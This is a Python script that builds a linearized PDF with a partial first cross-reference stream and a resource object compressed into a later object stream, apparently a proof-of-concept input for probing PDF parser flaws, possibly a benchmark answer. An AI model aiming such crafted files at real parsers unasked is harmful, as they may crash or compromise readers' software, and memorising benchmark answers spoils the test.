import os
import struct
from typing import Dict, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        def fmt10(n: int) -> bytes:
            s = str(int(n))
            if len(s) > 10:
                return s.encode("ascii")
            return s.zfill(10).encode("ascii")

        def obj(num: int, body: bytes) -> bytes:
            return str(num).encode("ascii") + b" 0 obj\n" + body + b"\nendobj\n"

        def stream_obj(num: int, dict_body: bytes, data: bytes) -> bytes:
            # dict_body should not include outer << >>
            d = b"<< " + dict_body + b" >>"
            return (
                str(num).encode("ascii")
                + b" 0 obj\n"
                + d
                + b"\nstream\n"
                + data
                + b"\nendstream\nendobj\n"
            )

        def make_objstm(objnum: int, embedded: Dict[int, bytes]) -> bytes:
            items = sorted(embedded.items(), key=lambda x: x[0])
            header_parts = []
            bodies = []
            cur_off = 0
            for onum, obody in items:
                header_parts.append(f"{onum} {cur_off}".encode("ascii"))
                if not obody.endswith(b"\n"):
                    obody += b"\n"
                bodies.append(obody)
                cur_off += len(obody)
            header = b" ".join(header_parts) + b"\n"
            first = len(header)
            data = header + b"".join(bodies)
            dict_body = (
                b"/Type /ObjStm "
                + b"/N "
                + str(len(items)).encode("ascii")
                + b" "
                + b"/First "
                + str(first).encode("ascii")
                + b" "
                + b"/Length "
                + str(len(data)).encode("ascii")
            )
            return stream_obj(objnum, dict_body, data)

        def pack_xref_entry(t: int, f1: int, f2: int, w0: int = 1, w1: int = 4, w2: int = 2) -> bytes:
            return (
                int(t).to_bytes(w0, "big", signed=False)
                + int(f1).to_bytes(w1, "big", signed=False)
                + int(f2).to_bytes(w2, "big", signed=False)
            )

        def make_xref_stream(
            num: int,
            size: int,
            index: Tuple[int, int],
            entries: Dict[int, Tuple[int, int, int]],
            root_ref: bytes,
            prev: int = None,
            w: Tuple[int, int, int] = (1, 4, 2),
        ) -> bytes:
            start, count = index
            w0, w1, w2 = w
            data = bytearray()
            for i in range(start, start + count):
                if i in entries:
                    t, f1, f2 = entries[i]
                else:
                    if i == 0:
                        t, f1, f2 = 0, 0, 65535
                    else:
                        t, f1, f2 = 0, 0, 0
                data += pack_xref_entry(t, f1, f2, w0, w1, w2)

            dict_parts = [
                b"/Type /XRef",
                b"/Size " + str(size).encode("ascii"),
                b"/W [" + b" ".join(str(x).encode("ascii") for x in w) + b"]",
                b"/Index [" + str(start).encode("ascii") + b" " + str(count).encode("ascii") + b"]",
                b"/Root " + root_ref,
                b"/Length " + str(len(data)).encode("ascii"),
            ]
            if prev is not None:
                dict_parts.insert(4, b"/Prev " + str(prev).encode("ascii"))
            dict_body = b" ".join(dict_parts)
            return stream_obj(num, dict_body, bytes(data))

        # Placeholders (10 bytes each)
        PH_L = b"LLLLLLLLLL"
        PH_H0 = b"HHHHHHHHHH"
        PH_H1 = b"IIIIIIIIII"
        PH_O = b"OOOOOOOOOO"
        PH_E = b"EEEEEEEEEE"
        PH_N = b"NNNNNNNNNN"
        PH_T = b"TTTTTTTTTT"

        buf = bytearray()
        buf += b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

        # 1 0 obj: Linearization dictionary with placeholders (fixed width to keep offsets stable)
        lin_dict = (
            b"<< /Linearized 1 "
            b"/L " + PH_L + b" "
            b"/H [ " + PH_H0 + b" " + PH_H1 + b" ] "
            b"/O " + PH_O + b" "
            b"/E " + PH_E + b" "
            b"/N " + PH_N + b" "
            b"/T " + PH_T +
            b" >>"
        )
        off_obj1 = len(buf)
        buf += obj(1, lin_dict)

        # 2 0 obj: Hint stream (dummy)
        hint_data = b"\x00" * 16
        off_obj2 = len(buf)
        buf += stream_obj(2, b"/Length " + str(len(hint_data)).encode("ascii"), hint_data)

        # 3 0 obj: Catalog
        catalog = b"<< /Type /Catalog /Pages 4 0 R >>"
        off_obj3 = len(buf)
        buf += obj(3, catalog)

        # 4 0 obj: Pages
        pages = b"<< /Type /Pages /Count 1 /Kids [11 0 R] >>"
        off_obj4 = len(buf)
        buf += obj(4, pages)

        # 11 0 obj: Page, references compressed resources (10 0 R)
        page = b"<< /Type /Page /Parent 4 0 R /MediaBox [0 0 200 200] /Resources 10 0 R /Contents 12 0 R >>"
        off_obj11 = len(buf)
        buf += obj(11, page)

        # 12 0 obj: Contents (empty)
        off_obj12 = len(buf)
        buf += stream_obj(12, b"/Length 0", b"")

        # First xref stream 13 0 obj (covers only 0..13 via /Index, but /Size declares full)
        # Object 10 is compressed in object stream 100, index 0
        xref1_num = 13
        xref1_off = len(buf)
        # /Size should be max obj num + 1 (we'll use 102 to include 101)
        size_total = 102
        entries_xref1 = {
            1: (1, off_obj1, 0),
            2: (1, off_obj2, 0),
            3: (1, off_obj3, 0),
            4: (1, off_obj4, 0),
            10: (2, 100, 0),
            11: (1, off_obj11, 0),
            12: (1, off_obj12, 0),
            13: (1, xref1_off, 0),
        }
        buf += make_xref_stream(
            xref1_num,
            size=size_total,
            index=(0, 14),
            entries=entries_xref1,
            root_ref=b"3 0 R",
            prev=None,
            w=(1, 4, 2),
        )

        # First section startxref and EOF
        buf += b"startxref\n" + str(xref1_off).encode("ascii") + b"\n%%EOF\n"
        end_first_section_off = len(buf)  # /E should point here (start of remainder)

        # Second part: object stream 100 containing object 10 (Resources dict)
        # Keep resources minimal but valid
        resources_obj10 = b"<< /ProcSet [/PDF] >>\n"
        objstm100_num = 100
        off_obj100 = len(buf)
        buf += make_objstm(objstm100_num, {10: resources_obj10})

        # Main xref stream 101 0 obj (full)
        xref2_num = 101
        xref2_off = len(buf)
        entries_xref2 = {
            1: (1, off_obj1, 0),
            2: (1, off_obj2, 0),
            3: (1, off_obj3, 0),
            4: (1, off_obj4, 0),
            10: (2, 100, 0),
            11: (1, off_obj11, 0),
            12: (1, off_obj12, 0),
            13: (1, xref1_off, 0),
            100: (1, off_obj100, 0),
            101: (1, xref2_off, 0),
        }
        buf += make_xref_stream(
            xref2_num,
            size=size_total,
            index=(0, size_total),
            entries=entries_xref2,
            root_ref=b"3 0 R",
            prev=xref1_off,
            w=(1, 4, 2),
        )

        buf += b"startxref\n" + str(xref2_off).encode("ascii") + b"\n%%EOF\n"

        # Patch linearization placeholders
        total_len = len(buf)
        def patch(marker: bytes, value: bytes):
            pos = buf.find(marker)
            if pos != -1 and len(value) == len(marker):
                buf[pos:pos + len(marker)] = value

        patch(PH_L, fmt10(total_len))
        patch(PH_H0, fmt10(off_obj2))
        patch(PH_H1, fmt10(len(hint_data)))
        patch(PH_O, fmt10(11))
        patch(PH_E, fmt10(end_first_section_off))
        patch(PH_N, fmt10(1))
        patch(PH_T, fmt10(xref2_off))

        return bytes(buf)